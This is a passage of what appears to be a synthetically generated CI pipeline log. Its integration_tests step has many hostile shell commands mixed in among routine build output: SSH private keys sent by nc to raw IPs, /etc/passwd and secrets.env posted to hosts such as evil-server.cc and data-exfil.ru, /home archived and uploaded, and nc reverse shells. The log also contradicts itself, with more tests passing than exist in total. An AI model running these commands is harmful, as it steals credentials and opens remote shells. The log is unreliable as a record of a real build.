created a lockfile\n[12:46:23] DEBUG: Connection pool: 9 active\nHEAD is now at 805ff35\n=== Step upload_artifacts completed ===\n=== Step: save_cache ===\n[12:46:23] DEBUG: Memory usage: 335MB\nCompleted.\nWARNING: jest has known vulnerabilities\nReady.\nSnapshots: 9 passed, 27 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm install: resolved 959 packages\n[12:46:23] INFO: Starting build process\nArtifact uploaded: build.tar.gz (3MB)\n\u2713 All checks passed\nPlatform: darwin-arm64\n[12:46:23] DEBUG: Memory usage: 1424MB\nBuilding Docker image...\nSnapshots: 10 passed, 10 total\nInstalling eslint@2.17.10\nPushing to registry...\nSuccess!\nArtifact uploaded: dist.zip (77MB)\nCompiling src/service.java...\nFinished.\nCreating production build...\nSwitched to branch 'bugfix/task-455'\nTransforming 948 files...\n[12:46:23] DEBUG: Loading configuration\n  PASS: integration/test_cache_hit.spec.js\nStep 7/16: Running migrations\nCompleted.\nOptimizing 58 modules...\n[12:46:23] INFO: Cache refreshed\nCompiling src/service.java...\nCache invalidated: dependencies\n[12:46:23] INFO: Request completed\nTest Suites: 44 passed, 38 total\n[12:46:23] INFO: Connecting to database\nSuccess!\nCompiling src/app.ts...\n[12:46:23] ERROR: Connection failed\n[12:46:23] DEBUG: Loading configuration\nFinished.\nFinished.\nyarn add: Done in 21.95s\nTLS handshake completed\n  PASS: unit/test_db_connect.spec.js\nProcessing...\nPulling image: alpine:latest\nnpm install: added 276 packages\nStep 12/21: Deploying\nPlatform: win32-x64\nProcessing...\nHEAD is now at 8908d85\nSwitched to branch 'hotfix/task-412'\nTransforming 379 files...\nPlatform: linux-x64\nStep 18/17: Linting\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCoverage: 94% statements, 89% branches\n\u2713 Step 'test' succeeded\nyarn add: Done in 11.65s\nSnapshots: 42 passed, 1 total\n\u2713 deploy completed\nArtifact uploaded: dist.zip (80MB)\nPOST /data - 200 (430ms)\npip: Downloading lodash-2.20.tar.gz\nPushing to registry...\nStep 7/22: Running migrations\n[12:46:23] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCreating production build...\nRan 120 tests in 27s\nCache miss for key-9915\nnpm notice: package.json updated\nSwitched to branch 'feature/task-624'\nPulling image: node:18\nTransforming 586 files...\nCache restored successfully (136MB)\nyarn add: Done in 9.41s\nStep 11/16: Testing\nStep 4/20: Deploying\nGET /status - 204 (16ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:23] INFO: Request completed\nnpm notice: package.json updated\nnpm install: resolved 320 packages\n\u2713 All checks passed\nWARNING: webpack has known vulnerabilities\n\u2713 Task completed in 3408ms\nStep 20/22: Deploying\nHEAD is now at bdd9746\nPOST /data - 202 (243ms)\n[12:46:23] WARN: Deprecated API usage\nWaiting...\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed eslint-3.8\n  PASS: e2e/test_api_health.spec.js\nImage pulled successfully\nStep 4/25: Building\n[12:46:23] INFO: Connecting to database\nWARNING: webpack has known vulnerabilities\nCache hit for key-1731\nCompiling lib/index.js...\nArtifact uploaded: build.tar.gz (4MB)\nChecking out main branch\n[12:46:23] INFO: Processing request\nStep 7/18: Testing\nStep 2/23: Building\nMinifying app.js\nCache hit for key-1641\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache restored successfully (99MB)\n[12:46:23] DEBUG: Memory usage: 1065MB\nChecking out develop branch\nBundling vendor.js\nArtifact uploaded: build.tar.gz (43MB)\nnpm install: added 245 packages\nPushing to registry...\n\u2713 All checks passed\nUsing Node.js 16.20.4\n[12:46:23] WARN: Deprecated API usage\npip install: Successfully installed express-3.0\nSnapshots: 0 passed, 1 total\nnpm notice: package.json updated\n\u2713 build completed\nException: NullPointerException\nTransforming 857 files...\nCreating production build...\nCache saved successfully\nEnvironment: test\nReady.\nStep 4/16: Deploying\nCompleted.\n[12:46:23] INFO: Cache refreshed\nFAILED: test_db_connect\nFetching submodules...\nDone.\n[12:46:23] INFO: Cache refreshed\nnpm install: added 379 packages\nnpm notice: package.json updated\nVerifying...\nProcessing...\nArtifact downloaded: 29MB\nStep 1/21: Testing\nWARNING: eslint has known vulnerabilities\n  PASS: unit/test_db_connect.spec.js\nCompiling src/utils.go...\nRan 147 tests in 43s\nException: ValueError\nStep 12/18: Linting\nGenerating source maps...\nStep 9/17: Installing dependencies\n\u2713 Task completed in 2376ms\nCache restored successfully (176MB)\n\u2713 All checks passed\nPulling image: node:latest\nRan 25 tests in 46s\n  PASS: test_user_create (315ms)\n\u2713 build completed\npip: Downloading axios-1.9.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling prettier@4.8.9\nCache saved successfully\n  PASS: integration/test_db_connect.spec.js\nGenerating source maps...\nyarn add: Done in 12.17s\nCache hit for key-9123\nDone.\nyarn add: Done in 19.20s\nTransforming 527 files...\nArtifact uploaded: dist.zip (75MB)\n[12:46:23] INFO: Connecting to database\n[12:46:23] INFO: Cache refreshed\nCache miss for key-4860\nTest Suites: 40 passed, 26 total\n=== Step save_cache completed ===\n=== Step: deploy_staging ===\nLoading...\nArtifact downloaded: 44MB\nnpm install: added 134 packages\nSuccess!\nLayer 6/9: RUN command\nBuilding Docker image...\n[12:46:23] ERROR: Connection failed\n  PASS: e2e/test_cache_hit.spec.js\n  PASS: test_db_connect (244ms)\nOK\nTest Suites: 24 passed, 21 total\nCompleted.\nTransforming 515 files...\nOptimizing 59 modules...\nStep 18/16: Running migrations\nCoverage: 85% statements, 94% branches\nTransforming 906 files...\nArtifact uploaded: build.tar.gz (38MB)\nStep 13/24: Linting\nStep 18/20: Testing\npip: Downloading eslint-2.9.tar.gz\nPushing to registry...\nUsing Python 3.9\nTest Suites: 27 passed, 40 total\nCoverage: 90% statements, 61% branches\nStep 1/15: Installing dependencies\nRan 102 tests in 36s\nArtifact downloaded: 5MB\nCache saved successfully\nHEAD is now at 17fcea5\nArtifact uploaded: build.tar.gz (12MB)\n[12:46:23] WARN: Deprecated API usage\n\u2713 Task completed in 414ms\nPushing to registry...\nWARNING: react has known vulnerabilities\nLoading...\nUsing Python 3.12\n\u2717 build failed with exit code 122\n[12:46:23] ERROR: Connection failed\nConnection established\nPOST /upload - 201 (499ms)\nStep 13/15: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nUsing Node.js 14.6.10\n  PASS: test_api_health (195ms)\nFAILED: test_api_health\nLayer 5/14: RUN command\nStep 13/25: Installing dependencies\nBuilding Docker image...\nFetching from https://pypi.org/package.json\nWARNING: webpack has known vulnerabilities\n[12:46:23] DEBUG: Memory usage: 1146MB\nUsing Node.js 19.3.0\nDone.\nVerifying...\n[12:46:23] DEBUG: Loading configuration\npip: Installing build dependencies...\nNODE_ENV=test\nPulling image: python:latest\nFetching from https://registry.npmjs.org/package.json\n[12:46:23] INFO: Request completed\nImage pulled successfully\n[12:46:23] DEBUG: Initializing service\nCreating production build...\nPOST /data - 201 (384ms)\nSwitched to branch 'hotfix/task-418'\nEnvironment: staging\n[12:46:23] DEBUG: Query executed in 72ms\nGenerating source maps...\nArtifact downloaded: 18MB\nyarn add: Done in 12.47s\npip: Downloading axios-5.11.tar.gz\n\u2713 Task completed in 1810ms\nCompiling lib/service.java...\nTransforming 857 files...\n[12:46:23] DEBUG: Loading configuration\nProcessing...\n[12:46:23] WARN: Deprecated API usage\nOptimizing 83 modules...\nnpm install: resolved 1931 packages\nTest Suites: 23 passed, 6 total\nTransforming 546 files...\npip install: Successfully installed webpack-5.2\nArtifact uploaded: dist.zip (75MB)\nArtifact downloaded: 9MB\nDone.\nUploading artifact 'build' (29 files)\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\nFetching submodules...\n  PASS: test_api_health (136ms)\nWaiting...\n[12:46:23] WARN: Deprecated API usage\nUploading artifact 'dist' (39 files)\nGenerating source maps...\nConnection established\nnpm install: resolved 921 packages\n[12:46:23] DEBUG: Initializing service\nCompiling utils/utils.go...\nLoading...\nStep 16/24: Linting\nOK\n[12:46:23] WARN: Deprecated API usage\nImage pulled successfully\nSuccess!\nWARNING: express has known vulnerabilities\nCompiling utils/main.py...\n[12:46:23] DEBUG: Connection pool: 14 active\nWARNING: express has known vulnerabilities\nTest Suites: 43 passed, 12 total\nGenerating source maps...\nOptimizing 86 modules...\n\u2713 Task completed in 4401ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: darwin-arm64\nWARNING: react has known vulnerabilities\nException: ValueError\nStep 7/20: Linting\n[12:46:23] DEBUG: Initializing service\nLoading...\npip install: Successfully installed lodash-5.10\npip install: Successfully installed eslint-2.5\n\u2717 build failed with exit code 118\npip: Collecting jest\nWARNING: lodash has known vulnerabilities\nHEAD is now at 0aaf751\nUsing Node.js 18.5.9\npip: Downloading axios-1.20.tar.gz\nHEAD is now at 3063de9\nTransforming 799 files...\n\u2717 build failed with exit code 123\nInstalling react@3.3.2\nCompiling components/main.py...\nArtifact uploaded: build.tar.gz (10MB)\nFAILED: test_api_health\nPulling image: alpine:3.11\npip: Installing build dependencies...\nStep 16/22: Deploying\nOptimizing 48 modules...\nImage pulled successfully\nGET /api - 200 (64ms)\nEnvironment: development\n  PASS: unit/test_db_connect.spec.js\nGenerating source maps...\nDone.\npip: Collecting lodash\n[12:46:23] INFO: Connecting to database\nException: NullPointerException\nImage pulled successfully\nTest Suites: 49 passed, 20 total\n[12:46:23] INFO: Connecting to database\nnpm install: resolved 584 packages\nWARNING: lodash has known vulnerabilities\nRan 17 tests in 24s\nStep 16/18: Linting\n\u2713 package completed\nHEAD is now at 2a217f5\nTests: 217 passed, 151 total\nInstalling prettier@3.10.10\nnpm notice: package.json updated\nTest Suites: 22 passed, 28 total\n[12:46:23] DEBUG: Initializing service\nLayer 2/10: RUN command\nReady.\nCoverage: 75% statements, 71% branches\nSnapshots: 15 passed, 6 total\nCompleted.\nCompiling lib/service.java...\nUploading artifact 'coverage' (10 files)\n\u2713 All checks passed\nPlatform: darwin-arm64\nCompiling src/index.js...\nSwitched to branch 'hotfix/task-784'\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\nRan 160 tests in 50s\n[12:46:23] INFO: Connecting to database\nTime: 67.577s\n[12:46:23] INFO: Processing request\nException: ValueError\n  PASS: integration/test_cache_hit.spec.js\n[12:46:23] INFO: Starting build process\nReady.\nNODE_ENV=test\n[12:46:23] DEBUG: Connection pool: 13 active\nLoading...\nyarn add: Done in 4.55s\nTests: 62 passed, 302 total\nLoading...\nPulling image: node:3.11\nOK\nUsing Python 3.11\n\u2713 Step 'build' succeeded\nWARNING: lodash has known vulnerabilities\nLoading...\nCache restored successfully (411MB)\nArtifact downloaded: 6MB\nCompiling utils/utils.go...\nnpm install: added 157 packages\nFAILED: test_auth_login\nOptimizing 16 modules...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out develop branch\n[12:46:23] INFO: Starting build process\nCache saved successfully\n[12:46:23] ERROR: Connection failed\n[12:46:23] DEBUG: Connection pool: 1 active\nCoverage: 90% statements, 61% branches\nCache restored successfully (422MB)\nPushing to registry...\nStep 13/16: Building\n\u2713 Task completed in 2589ms\nCompiling utils/utils.go...\nDone.\npip: Downloading express-3.11.tar.gz\n[12:46:23] INFO: Request completed\n[12:46:23] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nnpm notice: created a lockfile\n\u2713 Step 'install' succeeded\nStep 6/18: Testing\nPlatform: win32-x64\n[12:46:23] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\n\u2713 Step 'build' succeeded\nFetching submodules...\n\u2713 test completed\npip install: Successfully installed react-1.20\nSwitched to branch 'bugfix/task-149'\nStep 1/22: Deploying\nImage pulled successfully\nProcessing...\nVerifying...\nStep 19/21: Linting\nCompiling lib/index.js...\nTests: 229 passed, 423 total\n[12:46:23] INFO: Connecting to database\nMinifying main.js\n[12:46:23] DEBUG: Initializing service\nPulling image: python:18\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nRan 155 tests in 22s\nUsing Node.js 20.20.7\npip: Installing build dependencies...\nBuilding Docker image...\nyarn add: Done in 19.56s\nCompiling utils/index.js...\nTests: 121 passed, 390 total\n\u2713 deploy completed\n[12:46:23] INFO: Cache refreshed\nDone.\n  PASS: integration/test_user_create.spec.js\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 All checks passed\nUsing Node.js 16.19.5\nOptimizing 53 modules...\nCompiling lib/handler.rs...\nTLS handshake completed\nLayer 4/12: ENV command\nLoading...\nCache restored successfully (354MB)\n[12:46:23] INFO: Processing request\nAlready up to date.\nWARNING: jest has known vulnerabilities\n[12:46:23] INFO: Cache refreshed\nWARNING: lodash has known vulnerabilities\n[12:46:23] ERROR: Connection failed\n[12:46:23] INFO: Cache refreshed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFAILED: test_db_connect\nSuccess!\nHEAD is now at 3198bea\nnpm install: added 294 packages\nStep 3/16: Testing\nUsing Python 3.12\n[12:46:23] INFO: Processing request\n  PASS: test_user_create (104ms)\nRan 23 tests in 44s\n\u2713 Task completed in 1054ms\nEnvironment: test\nPushing to registry...\nOptimizing 93 modules...\nLayer 3/8: ENV command\nSuccess!\nFetching from https://npmjs.org/package.json\nArtifact uploaded: dist.zip (29MB)\nEnvironment: development\npip: Downloading lodash-2.20.tar.gz\nPlatform: linux-x64\nOK\n[12:46:23] DEBUG: Initializing service\n[12:46:23] WARN: Deprecated API usage\nTime: 115.771s\npip: Collecting lodash\nDone.\nCache restored successfully (450MB)\nStep 13/19: Testing\n\u2713 lint completed\n[12:46:23] INFO: Request completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBuilding Docker image...\nUploading artifact 'dist' (41 files)\nWARNING: axios has known vulnerabilities\nHEAD is now at 905b742\nWARNING: react has known vulnerabilities\nUsing Python 3.12\nLoading...\n[12:46:23] INFO: Request completed\nMinifying app.js\nStep 20/18: Linting\n[12:46:23] DEBUG: Loading configuration\n[12:46:23] DEBUG: Query executed in 25ms\npip install: Successfully installed express-1.12\nFetching from https://github.com/package.json\nCache invalidated: build\nPulling image: node:latest\nStep 1/18: Deploying\nStep 13/18: Linting\nTransforming 929 files...\n\u2713 test completed\nStep 8/21: Running migrations\n[12:46:23] INFO: Connecting to database\nSnapshots: 13 passed, 15 total\npip: Collecting eslint\nSuccess!\nCache miss for key-5666\nConnection established\nPulling image: node:latest\nWaiting...\nStep 1/23: Running migrations\nEnvironment: test\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:23] WARN: Deprecated API usage\nChecking out main branch\nProcessing...\n[12:46:23] WARN: Deprecated API usage\nArtifact downloaded: 50MB\n\u2713 Task completed in 3337ms\nCache hit for key-3752\nCompiling src/app.ts...\nStep 8/18: Installing dependencies\nTime: 36.647s\npip: Installing build dependencies...\nWaiting...\nCompiling src/service.java...\n=== Step restore_cache completed ===\n=== Step: lint ===\n[12:46:23] INFO: Connecting to database\nCompiling src/utils.go...\n[12:46:23] INFO: Connecting to database\nWARNING: axios has known vulnerabilities\nStep 6/15: Linting\nCoverage: 100% statements, 100% branches\n\u2717 build failed with exit code 39\nCreating production build...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSnapshots: 6 passed, 11 total\nFinished.\n  PASS: integration/test_cache_hit.spec.js\nLayer 2/13: COPY command\nnpm notice: created a lockfile\nRan 114 tests in 51s\nStep 19/15: Installing dependencies\nReady.\nPulling image: alpine:18\nRan 179 tests in 21s\nArtifact uploaded: dist.zip (14MB)\nWARNING: prettier has known vulnerabilities\nCompiling lib/handler.rs...\nMinifying vendor.js\nTLS handshake completed\nSnapshots: 38 passed, 17 total\nArtifact uploaded: dist.zip (85MB)\n\u2717 build failed with exit code 24\n[12:46:23] DEBUG: Connection pool: 2 active\nLoading...\nStep 5/24: Building\nStep 1/19: Testing\n\u2713 validate completed\n[12:46:23] INFO: Cache refreshed\nTests: 159 passed, 71 total\nAlready up to date.\nBundling vendor.js\nLayer 7/13: RUN command\nPOST /api - 201 (419ms)\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] INFO: Starting build process\nBundling main.js\nProcessing...\nFetching from https://googleapis.com/package.json\nCache saved successfully\nTLS handshake completed\nyarn add: Done in 23.89s\nStep 6/25: Building\nBuilding Docker image...\nDone.\nCompiling src/index.js...\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\n\u2713 lint completed\n[12:46:23] INFO: Connecting to database\nFetching submodules...\nTest Suites: 23 passed, 16 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:23] DEBUG: Connection pool: 13 active\nyarn add: Done in 4.8s\nLayer 3/8: RUN command\nUsing Python 3.12\n[12:46:23] ERROR: Connection failed\nFetching submodules...\nReady.\n[12:46:23] DEBUG: Query executed in 34ms\nSwitched to branch 'hotfix/task-353'\nRan 70 tests in 54s\n[12:46:23] INFO: Request completed\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nGenerating source maps...\nnpm install: resolved 585 packages\nConnection established\npip: Downloading lodash-4.7.tar.gz\nUsing Python 3.12\nCache invalidated: build\nStep 6/21: Testing\nRan 200 tests in 35s\npip: Installing build dependencies...\nFinished.\nFinished.\n[12:46:23] INFO: Cache refreshed\nFetching submodules...\nFAILED: test_api_health\n[12:46:23] INFO: Connecting to database\nArtifact downloaded: 12MB\nTime: 62.376s\nArtifact downloaded: 7MB\nHEAD is now at 9052a12\nGenerating source maps...\nWARNING: express has known vulnerabilities\nStep 4/21: Testing\nTest Suites: 24 passed, 23 total\nConnection established\nTime: 114.49s\nCompiling lib/service.java...\nPOST /data - 202 (432ms)\nTest Suites: 37 passed, 24 total\n[12:46:23] INFO: Cache refreshed\nCompiling utils/utils.go...\nDone.\nyarn add: Done in 28.64s\nLayer 1/9: ENV command\nyarn add: Done in 8.71s\n[12:46:23] DEBUG: Loading configuration\nnpm install: resolved 1373 packages\nFinished.\nMinifying main.js\npip: Installing build dependencies...\nFetching from https://pypi.org/package.json\nWARNING: lodash has known vulnerabilities\nCache hit for key-9668\n\u2713 package completed\nCache restored successfully (334MB)\nUploading artifact 'build' (40 files)\nnpm install: resolved 1392 packages\nnpm notice: created a lockfile\nStep 17/25: Running migrations\nnpm install: resolved 1819 packages\nnpm notice: package.json updated\nLayer 8/10: COPY command\n\u2713 Step 'setup' succeeded\nConnection established\npip: Collecting lodash\nInstalling prettier@2.2.7\nFinished.\n[12:46:23] DEBUG: Initializing service\nStep 9/23: Deploying\nGET /status - 200 (98ms)\nGET /api - 201 (25ms)\nTest Suites: 36 passed, 34 total\nCompiling src/service.java...\npip: Collecting webpack\n  PASS: e2e/test_auth_login.spec.js\nFinished.\nnpm notice: package.json updated\n[12:46:23] DEBUG: Loading configuration\npip: Downloading jest-2.5.tar.gz\nPlatform: darwin-arm64\nBuilding Docker image...\nCache miss for key-8091\nLoading...\nVerifying...\nTLS handshake completed\nArtifact downloaded: 31MB\nLoading...\n[12:46:23] INFO: Processing request\nStep 12/21: Testing\nCompiling lib/app.ts...\nStep 17/24: Linting\nnpm install: added 485 packages\nProcessing...\nnpm notice: package.json updated\n  PASS: e2e/test_auth_login.spec.js\n\u2713 Step 'checkout' succeeded\nOptimizing 50 modules...\nStep 14/18: Installing dependencies\nWaiting...\nNODE_ENV=production\nGenerating source maps...\nSnapshots: 7 passed, 28 total\n  PASS: test_api_health (172ms)\nChecking out main branch\n[12:46:23] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 434 files...\n[12:46:23] INFO: Request completed\n[12:46:23] INFO: Starting build process\n[12:46:23] WARN: Deprecated API usage\n[12:46:23] INFO: Request completed\nFinished.\n[12:46:23] WARN: Deprecated API usage\n=== Step lint completed ===\n=== Step: integration_tests ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 31.216.117.222 35168\nnpm install: added 224 packages\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\npip install: Successfully installed eslint-1.13\npip: Downloading express-3.7.tar.gz\n[12:46:23] WARN: Deprecated API usage\nMinifying app.js\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n[12:46:23] INFO: Request completed\nPushing to registry...\nCache invalidated: dependencies\nStep 10/17: Deploying\n[12:46:23] WARN: Deprecated API usage\nCompiling src/index.js...\nCache miss for key-1503\npip: Downloading prettier-3.14.tar.gz\nException: ValueError\n\u2713 deploy completed\nPushing to registry...\nLayer 10/11: RUN command\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (65MB)\nLayer 8/12: COPY command\nSending 222MB of data to malicious-pool.xyz\nTest Suites: 30 passed, 15 total\nCache miss for key-6813\n[12:46:23] ERROR: Connection failed\n[12:46:23] WARN: Deprecated API usage\nTime: 45.829s\n\u2713 build completed\n[12:46:23] DEBUG: Loading configuration\nTests: 270 passed, 358 total\nArtifact downloaded: 7MB\n[12:46:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (14MB)\n[12:46:23] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nDone.\nChecking out main branch\nPushing to registry...\nSending 270MB of data to data-exfil.ru\nCompiling lib/utils.go...\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nOptimizing 57 modules...\nTest Suites: 29 passed, 17 total\nSending 209MB of data to crypto-mine.io\nWaiting...\nUsing Python 3.9\nTransforming 178 files...\n\u2713 Step 'build' succeeded\nTests: 100 passed, 227 total\nStep 7/16: Deploying\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nAlready up to date.\nFetching submodules...\nGenerating source maps...\nProcessing...\nUsing Python 3.10\nBuilding Docker image...\nEnvironment: development\nReady.\nStep 7/16: Running migrations\nnc -e /bin/sh 24.17.22.105 25957\n[12:46:23] DEBUG: Memory usage: 1490MB\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nTest Suites: 12 passed, 20 total\nUploading artifact 'build' (47 files)\nyarn add: Done in 23.17s\nArtifact downloaded: 48MB\nGET /status - 200 (23ms)\npip: Collecting eslint\nGenerating source maps...\nOptimizing 96 modules...\nTLS handshake completed\nWARNING: lodash has known vulnerabilities\n\u2713 deploy completed\nOptimizing 53 modules...\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-842'\nUploading artifact 'build' (38 files)\nAlready up to date.\n[12:46:23] ERROR: Connection failed\nEnvironment: production\nCompiling lib/utils.go...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.140.14.223 16929\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nCompiling utils/service.java...\n\u2713 All checks passed\npip: Installing build dependencies...\nLoading...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nnpm install: added 386 packages\nGET /status - 200 (21ms)\nFetching from https://registry.npmjs.org/package.json\nChecking out main branch\necho $(cat ~/.ssh/id_rsa) | base64 | nc 79.249.62.98 11634\nWARNING: axios has known vulnerabilities\nStep 15/21: Building\nGenerating source maps...\nInstalling lodash@1.2.10\nNODE_ENV=test\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nOptimizing 99 modules...\nReady.\npip: Installing build dependencies...\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\nUsing Python 3.9\nEnvironment: production\nCache restored successfully (270MB)\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nRan 177 tests in 46s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 15/18: Deploying\nException: TypeError\n[12:46:23] DEBUG: Initializing service\nyarn add: Done in 14.62s\necho $(cat ~/.ssh/id_rsa) | base64 | nc 111.0.62.137 28101\nnpm notice: package.json updated\n\u2713 All checks passed\n[12:46:23] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nWARNING: react has known vulnerabilities\nVerifying...\nOptimizing 17 modules...\nTransforming 211 files...\n\u2717 build failed with exit code 31\nOK\npip install: Successfully installed prettier-4.15\nWARNING: webpack has known vulnerabilities\nCompiling src/utils.go...\nFinished.\n[12:46:23] INFO: Cache refreshed\nStep 12/17: Building\n[12:46:23] ERROR: Connection failed\nSuccess!\n[12:46:23] DEBUG: Loading configuration\nSending 137MB of data to data-exfil.ru\npip install: Successfully installed webpack-5.12\nFetching from https://github.com/package.json\nArtifact uploaded: dist.zip (32MB)\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nCompiling lib/service.java...\nPlatform: win32-x64\nCache miss for key-4805\nTLS handshake completed\nUploading artifact 'build' (25 files)\n  PASS: test_db_connect (384ms)\nImage pulled successfully\nUsing Node.js 20.7.3\n  PASS: test_db_connect (224ms)\nSnapshots: 1 passed, 33 total\nConnection established\nPulling image: node:latest\n[12:46:23] INFO: Cache refreshed\nStep 8/20: Running migrations\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling lib/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n[12:46:23] DEBUG: Loading configuration\nBundling main.css\nPulling image: node:latest\nArtifact downloaded: 13MB\nFetching submodules...\n[12:46:23] DEBUG: Initializing service\nUploading artifact 'coverage' (36 files)\nWaiting...\nnc -e /bin/sh 9.162.107.240 1343\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_api_health\nCreating production build...\nTransforming 920 files...\nFAILED: test_db_connect\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSending 232MB of data to malicious-pool.xyz\necho $(cat ~/.ssh/id_rsa) | base64 | nc 173.0.31.154 20317\nReady.\n[12:46:23] INFO: Processing request\nCompiling lib/utils.go...\nCache saved successfully\nStep 6/21: Linting\nCache hit for key-4698\nnc -e /bin/sh 152.241.205.27 17868\nSending 123MB of data to evil-server.cc\nCompiling lib/index.js...\n\u2717 build failed with exit code 8\nSwitched to branch 'bugfix/task-780'\nCompleted.\nCache hit for key-2209\nnpm install: added 368 packages\nConnection established\nOK\nCache saved successfully\nArtifact uploaded: dist.zip (32MB)\n[12:46:23] INFO: Starting build process\nFAILED: test_cache_hit\nPOST /data - 202 (122ms)\n[12:46:23] WARN: Deprecated API usage\nAlready up to date.\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-14T12:46:23.644472",
        "finished_at": "2025-12-14T12:46:29.020565",
        "log_lines": [
          "=== Step: checkout ===",
          "Environment: staging",
          "Pulling image: alpine:latest",
          "[12:46:23] WARN: Deprecated API usage",
          "Layer 3/13: RUN command",
          "pip: Downloading axios-2.7.tar.gz",
          "Layer 8/13: ENV command",
          "[12:46:23] INFO: Connecting to database",
          "  PASS: integration/test_api_health.spec.js",
          "Cache hit for key-8984",
          "  PASS: test_auth_login (206ms)",
          "  PASS: integration/test_api_health.spec.js",
          "Time: 102.424s",
          "Building Docker image...",
          "\u2713 Step 'test' succeeded",
          "npm notice: package.json updated",
          "Compiling utils/app.ts...",
          "Pulling image: alpine:latest",
          "Pulling image: python:3.11",
          "npm notice: created a lockfile",
          "Installing webpack@2.11.10",
          "Transforming 826 files...",
          "[12:46:23] WARN: Deprecated API usage",
          "Using Node.js 15.10.0",
          "Ran 76 tests in 7s",
          "Compiling src/handler.rs...",
          "Checking out master branch",
          "Ready.",
          "Uploading artifact 'coverage' (45 files)",
          "Platform: win32-x64",
          "WARNING: axios has known vulnerabilities",
          "Waiting...",
          "yarn add: Done in 6.45s",
          "Compiling components/service.java...",
          "Cache hit for key-4657",
          "[12:46:23] DEBUG: Memory usage: 1145MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache invalidated: dependencies",
          "Fetching from https://npmjs.org/package.json",
          "npm notice: package.json updated",
          "Completed.",
          "Creating production build...",
          "Minifying vendor.js",
          "Layer 8/10: RUN command",
          "Cache hit for key-1658",
          "Verifying...",
          "Coverage: 90% statements, 61% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_api_health (84ms)",
          "[12:46:23] ERROR: Connection failed",
          "pip: Downloading express-3.0.tar.gz",
          "Cache saved successfully",
          "Bundling runtime.js",
          "Exception: RuntimeError",
          "Step 12/21: Testing",
          "[12:46:23] INFO: Connecting to database",
          "Artifact uploaded: dist.zip (56MB)",
          "Optimizing 94 modules...",
          "Image pulled successfully",
          "[12:46:23] INFO: Starting build process",
          "\u2713 build completed",
          "HEAD is now at 4dbe987",
          "[12:46:23] INFO: Connecting to database",
          "Cache restored successfully (346MB)",
          "[12:46:23] DEBUG: Query executed in 87ms",
          "Using Node.js 18.14.0",
          "\u2713 Task completed in 375ms",
          "[12:46:23] INFO: Starting build process",
          "Step 7/24: Building",
          "pip: Collecting jest",
          "Minifying main.js",
          "Checking out develop branch",
          "\u2713 validate completed",
          "Image pulled successfully",
          "Compiling lib/main.py...",
          "\u2717 build failed with exit code 58",
          "HEAD is now at a1f7bba",
          "POST /upload - 200 (300ms)",
          "Step 5/15: Running migrations",
          "Loading...",
          "Compiling lib/utils.go...",
          "npm install: resolved 252 packages",
          "Step 2/23: Testing",
          "Success!",
          "Finished.",
          "npm notice: package.json updated",
          "pip: Collecting jest",
          "npm install: resolved 1749 packages",
          "\u2713 Step 'setup' succeeded",
          "Checking out develop branch",
